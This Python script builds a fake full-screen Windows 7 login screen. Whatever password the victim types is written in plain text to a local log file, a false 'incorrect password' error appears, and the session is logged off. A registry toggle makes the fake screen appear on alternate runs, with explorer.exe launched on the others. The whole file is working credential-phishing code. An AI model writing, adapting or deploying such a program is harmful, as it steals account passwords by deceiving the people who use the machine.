import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
import winreg
import ctypes
import subprocess
from screeninfo import get_monitors

class Windows7LoginScreen:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Windows 7 Login")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        
        self.screen_width = 0
        self.screen_height = 0
        for monitor in get_monitors():
            self.screen_width = monitor.width   
            self.screen_height = monitor.height
            break
        self.root.geometry(f"{self.screen_width}x{self.screen_height}")
        
        self.bg_photo = None
        self.load_background()
        
        self.create_login_ui()
        
    def on_entry_clickU(self, event):
        if self.username_entry.get() == "user name":
            self.username_entry.delete(0, tk.END)
            self.username_entry.config(fg="black")
            if self.password_entry.get() == "":
                self.password_entry.insert(0, "password")
                self.password_entry.config(fg="grey", show="")

    def on_focus_outU(self, event):
        if self.username_entry.get() == "":
            self.username_entry.insert(0, "user name")
            self.username_entry.config(fg="grey")
    
    def on_entry_clickP(self, event):
        if self.password_entry.get() == "password":
            self.password_entry.delete(0, tk.END)
            self.password_entry.config(fg="black", show="•")

    def on_focus_outP(self, event):
        if self.password_entry.get() == "":
            self.password_entry.insert(0, "password")
            self.password_entry.config(fg="grey", show="")

    def load_background(self):
        bg_image = Image.open("C:\\Users\\User\\background.png")
        bg_image = bg_image.resize((self.screen_width, self.screen_height), Image.Resampling.LANCZOS)
        self.bg_photo = ImageTk.PhotoImage(bg_image)
        self.bg_label = tk.Label(
            self.root, 
            image=self.bg_photo
        )
        self.bg_label.place(x=0, y=0, relwidth=1, relheight=1)


    def create_login_ui(self):
        icon_image = Image.open("C:\\Users\\User\\icon.png")
        icon_image = icon_image.resize((150, 150), Image.Resampling.LANCZOS)
        self.user_icon = ImageTk.PhotoImage(icon_image)
        
        self.icon_label = tk.Label(
            self.root,
            image=self.user_icon
        )
        self.icon_label.place(relx=0.52, rely=0.38, anchor="center")
    
        self.username_entry = tk.Entry(
        self.root,
        width=25,
        font=("Segoe UI", 11),
        bg="white",
        fg="grey"
        )
        self.username_entry.place(relx=0.4, rely=0.5, width=220, height=20)
        self.username_entry.insert(0, "user name")
        self.username_entry.bind("<FocusIn>", self.on_entry_clickU)
        self.username_entry.bind("<FocusOut>", self.on_focus_outU)
        
        self.password_entry = tk.Entry(
            self.root,
            width=25,
            font=("Segoe UI", 11),
            bg="white",
            fg="grey",
            show=""
        )
        self.password_entry.place(relx=0.4, rely=0.53, width=220, height=20)
        self.password_entry.insert(0, "password")
        self.password_entry.bind("<FocusIn>", self.on_entry_clickP)
        self.password_entry.bind("<FocusOut>", self.on_focus_outP)
        self.password_entry.bind("<Return>", lambda e: self.login())
        
        login_btn = tk.Button(
            self.root,
            text="➜",
            font=("Segoe UI", 11),
            bg="blue",
            fg="white",
            command=self.login
        )
        login_btn.place(relx=0.61, rely=0.53, width=25, height=20)
        shutdown_btn = tk.Button(
            self.root,
            text="X",
            font=("Segoe UI", 11, "bold"),
            bg="red",
            fg="black",
            command=self.shutdown
        )
        shutdown_btn.place(relx=0.9, rely=0.9, width=40, height=40)

    def login(self):
        username = self.username_entry.get()
        password = self.password_entry.get()
        
        if username == "user name":
            username = ""
        if password == "password":
            password = ""
        
        if password:
            with open("C:\\Users\\User\\log.txt", "a") as f:
                f.write(f"Username: {username}, Password: {password}\n")
            self.incorrectlog()
    
    def incorrectlog(self):
        messagebox.showerror(title="Error", message="Incorrect username or password!")
        self.shutdown()
    
    def shutdown(self):
        ctypes.windll.user32.ExitWindowsEx(0, 0)
    
    def close_window(self):
        self.root.destroy()
    
    def run(self):
        self.root.mainloop()

def check_registry_key():
    REG_PATH = r"Software\\Win7Login"
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
    winreg.CloseKey(key)
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ) as reg_key:
        value, _ = winreg.QueryValueEx(reg_key, "key")
        
    new_value = 1 if value == 0 else 0

    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE) as reg_key:
        winreg.SetValueEx(reg_key, "key", 0, winreg.REG_DWORD, new_value)
    if new_value == 0:
        subprocess.Popen("C:\\Windows\\explorer.exe")
    return new_value

if __name__ == "__main__":
    state = check_registry_key()
    if state == 1:
        app = Windows7LoginScreen()
        app.run()

print("Черемша")